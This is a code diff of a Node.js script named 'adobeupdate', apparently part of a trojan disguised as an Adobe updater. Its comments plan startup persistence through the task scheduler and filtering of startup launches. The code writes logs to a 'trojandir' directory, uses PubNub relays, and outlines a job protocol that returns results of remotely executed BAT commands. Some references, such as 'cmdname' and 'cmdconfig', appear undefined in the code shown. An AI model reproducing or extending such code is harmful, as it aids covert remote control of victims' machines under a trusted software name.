@@ -20,10 +20,10 @@ debugger;
 // --- TASKS LIST ---
 // ! one time setup:
 //   write userid to text file
-//   pcmon, psrelay , noderelay, pythonrelay --> these should all be kicked off 
+//   pcmon, psrelay , noderelay, pythonrelay --> these should all be kicked off
 //   by task scheduler at startup
 
-// ! implement reset mechanism in relays --> node relay --> clear session and start 
+// ! implement reset mechanism in relays --> node relay --> clear session and start
 //   from scratch
 // ! need to filter out task, startup folder, reg startup launches --> we don't want the task launches to
 //   execute penetrate
@@ -32,6 +32,7 @@ debugger;
 const helper = require("./adobeupdate.helper.js");
 const helper_config = require("./adobeupdate.helper.config.js");
 const helper_ps = require("./adobeupdate.helper.ps.js");
+const helper_cmd = require("./adobeupdate.helper.cmd.js");
 
 const path = require("path");
 const PubNub = require("pubnub");
@@ -45,7 +46,7 @@ const util = require("util");
 const ISDEBUG = true;
 
 function ensureSingleInstancePipe(initfunc) {
-    const PIPE_NAME = systemconfig.lockfname;
+    const PIPE_NAME = helper_config.systemconfig.lockfname;
 
     helper.logmsg(`obtaining lock  ${PIPE_NAME}`);
 
@@ -75,12 +76,28 @@ function ensureSingleInstancePipe(initfunc) {
 
 let cmdarr = helper_ps.process_argv;
 let cmdarrstr = cmdarr ? cmdarr.join() : "";
-let cmdfunc = helper_config.systemconfig.cmdconfig?.cmdfunc;
 
-helper.logmsg(`starting --  ${helper_config.systemconfig.statestr} -- ${cmdarrstr} -- scriptmd5=${helper_config.systemconfig.scriptmd5}`);
+let scriptts = helper.getTimestamp();
+let cmdtaskname = helper_ps.getcmdtaskname();
 
-ensureSingleInstancePipe(cmdfunc);
+let logfpath = (() => {
+    let tcmdtaskname = !helper.isNullOrWhitespace(cmdtaskname)
+        ? "_" + cmdtaskname
+        : "";
 
+    return path.join(
+        helper_config.systemconfig.trojandir,
+        `master_${cmdname}${tcmdtaskname}_${scriptts}.log`
+    );
+})();
+
+helper.logfpath = logfpath;
+
+helper.logmsg(
+    `starting --  ${helper_config.systemconfig.statestr} -- ${cmdarrstr} -- scriptmd5=${helper_config.systemconfig.scriptmd5}`
+);
+
+ensureSingleInstancePipe(cmdconfig.cmdfunc);
 
 /*
 let clientjob = {
@@ -103,7 +120,6 @@ outgoing result
 { status:'ERROR', scriptengine:'BAT', execresult:data, seqid:1234+1, cmdid:random 8 digit code, ts:timestamp }
 { status:'INFO', scriptengine:'BAT', execresult:data, seqid:1234+1, cmdid:random 8 digit code, ts:timestamp }
 */
-
 
 /*
     {
